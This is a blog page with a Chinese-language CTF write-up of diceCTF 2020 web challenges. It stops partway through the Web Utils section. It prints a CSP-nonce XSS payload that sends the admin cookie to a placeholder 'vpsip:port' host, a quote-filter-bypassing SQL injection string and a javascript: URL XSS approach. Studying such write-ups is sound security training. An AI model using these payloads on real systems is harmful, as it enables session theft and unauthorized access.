@@ -1,0 +1,881 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+
+    <title>diceCTF2020 Web题解 | sakai&#39;s blog</title>
+    <meta property="og:title" content="diceCTF2020 Web题解 - sakai&#39;s blog">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2021-02-19T15:30:34&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2021-02-19T15:30:34&#43;08:00'>
+        
+    <meta name="Keywords" content="web,java,python,CTF,内网">
+    <meta name="description" content="diceCTF2020 Web题解">
+        
+    <meta name="author" content="sakai">
+    <meta property="og:url" content="http://segogt.github.io/post/%E8%AE%B0%E4%B8%80%E5%9C%BA%E7%BA%AFjs%E8%B5%9Bdicectf2020-web%E9%A2%98%E8%A7%A3/">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+        <link href="https://cdn.bootcdn.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" rel="stylesheet">
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="http://segogt.github.io/">
+                        sakai&#39;s blog
+                    </a>
+                
+                <p class="description">web/java/python/CTF</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="http://segogt.github.io/">首页</a>
+                    
+                    <a  href="http://segogt.github.io/archives/" title="归档">归档</a>
+                    
+                    <a  href="http://segogt.github.io/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#babier-csp">Babier CSP</a></li>
+    <li><a href="#missing-flavortext">Missing Flavortext</a></li>
+    <li><a href="#web-utils">Web Utils</a></li>
+    <li><a href="#build-a-panel">Build a Panel</a></li>
+    <li><a href="#web-ide">Web IDE</a></li>
+    <li><a href="#build-a-better-panel">Build a Better Panel</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">diceCTF2020 Web题解</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2021年2月19日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='/categories/ctf'>ctf</a></span>
+            
+            <span class="meta-category"><a href='/categories/web'>web</a></span>
+            
+        </div>
+        
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <blockquote>
+<p>本文已在<strong>安全客</strong>平台发布，转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/231421">https://www.anquanke.com/post/id/231421</a></p>
+</blockquote>
+<p>前段时间我参加了一场国外的比赛，与国内的web题目以php和python居多不同，感觉国外比赛中考察js尤其nodejs的内容比较多，而这场更是基本都是js题目，觉得有些点比较新奇，这里来分享一下wp。</p>
+<p>网址是<code>https://ctf.dicega.ng/</code>下面有些题目源码比较长，我只贴关键部分，可以自行下载源码。</p>
+<h2 id="babier-csp">Babier CSP</h2>
+<p>题目源码是这样</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./config.js&#34;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>;
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SECRET</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">secret</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">NONCE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span> =&gt; <span style="color:#e6db74">`
+</span><span style="color:#e6db74">&lt;html&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`&lt;h1&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/h1&gt;`</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;a href=&#39;#&#39; id=elem&gt;View Fruit&lt;/a&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;script nonce=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;
+</span><span style="color:#e6db74">elem.onclick = () =&gt; {
+</span><span style="color:#e6db74">  location = &#34;/?name=&#34; + encodeURIComponent([&#34;apple&#34;, &#34;orange&#34;, &#34;pineapple&#34;, &#34;pear&#34;][Math.floor(4 * Math.random())]);
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">&lt;/script&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;/html&gt;
+</span><span style="color:#e6db74">`</span>;
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>, <span style="color:#e6db74">`default-src none; script-src &#39;nonce-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">NONCE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>);
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>));
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">SECRET</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/secret&#34;</span>));
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Example app listening at http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+})
+</code></pre></div><p>通过源码可以看出，flag在/SECRET这个路由中，题目给出了admin bot，也描述给出了说明</p>
+<pre><code>The admin will set a cookie secret equal to config.secret in index.js.
+</code></pre><p>所以很明确就是考察通过xss盗取admin bot的cookie。
+考察了CSP的bypass，很容易发现这道题中nonce的值是固定不变的，所以csp的防护相当于没有作用，我们只要在scirpt中传入同样固定的的nonce值即可。
+首先传入alert(1)测试
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnidz9vo3mj32rk0eagpy.jpg">
+            <img class="mx-auto" alt="1" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnidz9vo3mj32rk0eagpy.jpg" />
+        </a>
+    
+下一步构造一个请求，并用admin bot发起请求，在服务端nc监听一下即可</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://babier-csp.dicec.tf/?name<span style="color:#f92672">=</span>%3Cscript%20nonce<span style="color:#f92672">=</span>g%2bojjmb9xLfE%2b3j9PsP/Ig<span style="color:#f92672">==</span>%3Ewindow.location.href<span style="color:#f92672">=</span>%22http://vpsip:port/?q<span style="color:#f92672">=</span>%22%2bdocument.cookie%3C/script%3E
+</code></pre></div><p>
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnie107h2bj32a0084qat.jpg">
+            <img class="mx-auto" alt="2" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnie107h2bj32a0084qat.jpg" />
+        </a>
+    
+得到secret=4b36b1b8e47f761263796b1defd80745,最后访问相应的路由即可
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnie1yyi39j32de0n0qav.jpg">
+            <img class="mx-auto" alt="3" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnie1yyi39j32de0n0qav.jpg" />
+        </a>
+    </p>
+<h2 id="missing-flavortext">Missing Flavortext</h2>
+<p>源码如下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;better-sqlite3&#39;</span>)(<span style="color:#e6db74">&#39;db.sqlite3&#39;</span>)
+
+<span style="color:#75715e">// remake the `users` table
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">`DROP TABLE IF EXISTS users;`</span>);
+<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">`CREATE TABLE users(
+</span><span style="color:#e6db74">  id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span><span style="color:#e6db74">  username TEXT,
+</span><span style="color:#e6db74">  password TEXT
+</span><span style="color:#e6db74">);`</span>);
+
+<span style="color:#75715e">// add an admin user with a random password
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">`INSERT INTO users (username, password) VALUES (
+</span><span style="color:#e6db74">  &#39;admin&#39;,
+</span><span style="color:#e6db74">  &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">16</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">)`</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+
+<span style="color:#75715e">// parse json and serve static files
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }));
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;static&#39;</span>));
+
+<span style="color:#75715e">// login route
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;first&#39;</span>)
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+  }
+
+  <span style="color:#66d9ef">if</span> ([<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>].<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">v</span> =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>))) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;detected&#34;</span>)
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+  }
+
+  <span style="color:#75715e">// see if user is in database
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT id FROM users WHERE
+</span><span style="color:#e6db74">    username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; AND
+</span><span style="color:#e6db74">    password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">  `</span>;
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">query</span>)
+
+  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
+  <span style="color:#66d9ef">try</span> { 
+    <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">get</span>()<span style="color:#f92672">?</span>.<span style="color:#a6e22e">id</span> 
+  } <span style="color:#66d9ef">catch</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+  }
+
+  <span style="color:#75715e">// correct login
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#e6db74">&#39;flag.html&#39;</span>, { <span style="color:#a6e22e">root</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">__dirname</span> });
+
+  <span style="color:#75715e">// incorrect login
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>,<span style="color:#a6e22e">debug</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>);
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;start!&#34;</span>)
+</code></pre></div><p>很明显在查询语句处存在一个sql注入，只需要传入username=admin' or &lsquo;1&rsquo;=&lsquo;1&ndash;%20即可，但问题是中间过滤了单引号。
+后来一搜索，发现这道题目的原题是redpwnCTF2020的login，跟原题比较一下，发现原题在开始处判断了username和password是不是string类型，而本题没有，于是考虑到用数组绕过。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">username</span>[]<span style="color:#f92672">=</span><span style="color:#a6e22e">admin</span><span style="color:#e6db74">&#39;or &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p>
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnifnnta94j31pa0m8hdt.jpg">
+            <img class="mx-auto" alt="3" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnifnnta94j31pa0m8hdt.jpg" />
+        </a>
+    </p>
+<h2 id="web-utils">Web Utils</h2>
+<p>这个网站实现了剪贴板的功能，例如在上面输入一些文字，点击shorten，就会生成对应一个网址的短链接，访问可以看到之前存的文字
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnifovmya1j31pa0sitad.jpg">
+            <img class="mx-auto" alt="4" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnifovmya1j31pa0sitad.jpg" />
+        </a>
+    
+本题目也是明确在描述中说明，需要拿到管理员cookie，基于这一点，又我们输入的内容会直接回显到页面上，我想不是直接构造一个xss就ok了嘛，于是写了xss尝试访问
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnifq0ipxaj31hs09ktam.jpg">
+            <img class="mx-auto" alt="5" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnifq0ipxaj31hs09ktam.jpg" />
+        </a>
+    
+但是什么都没有发生，于是去看源码（注：每道题主办方都提供了源码下载），在页面显示这块，对应的view.html</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!doctype html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">async</span>&gt;
+    (<span style="color:#66d9ef">async</span> () =&gt; {
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">pathname</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#ae81ff">2</span>];
+      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">id</span>)
+      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(window.<span style="color:#a6e22e">origin</span>)
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">id</span>) window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">origin</span>;
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">origin</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/api/data/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+      <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">type</span> } <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>();
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">type</span> ) window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">origin</span>;
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;link&#39;</span>) <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+      <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;complete&#34;</span>)
+        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">r</span>) =&gt; { window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, <span style="color:#a6e22e">r</span>); });
+      document.<span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Paste&#39;</span>;
+      document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;div&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+    })()
+  &lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;font-family: monospace&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>这里的data，就是我们在剪贴板上存的数据。关键在于这里是用textContent来输出的data，搜索一番后发现，这玩意好像是没办法xss的。于是把目光放到另一句</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;link&#39;</span>) <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</code></pre></div><p>因为data就是用户输入的数据，假如构造一个</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">window.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>就可以实现xss了。所以需要构造一个type为link，且data为<code>javascript:alert(1)</code>的数据，再访问。</p>
+<p>但是看一下<code>createLink</code>路由的代码做了一个正则校验，只能插入http开头的数据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#39;^https?://&#39;</span>);
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span>))
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rep</span>
+          .<span style="color:#a6e22e">code</span>(<span style="color:#ae81ff">200</span>)
+          .<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;application/json; charset=utf-8&#39;</span>)
+          .<span style="color:#a6e22e">send</span>({
+            <span style="color:#a6e22e">statusCode</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">200</span>,
+            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid URL&#39;</span>
+          });
+</code></pre></div><p>而<code>createPaste</code>路由处没有任何校验,这里的关键是这一句</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">addData</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;paste&#39;</span>, ...<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">uid</span> });
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//addData函数定义
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">statements</span> <span style="color:#f92672">=</span> {
+  <span style="color:#a6e22e">addData</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO data (uid, data, type) VALUES (?, ?, ?);`</span>)
+}
+  <span style="color:#a6e22e">addData</span><span style="color:#f92672">:</span> ({ <span style="color:#a6e22e">uid</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">type</span> }) =&gt; {
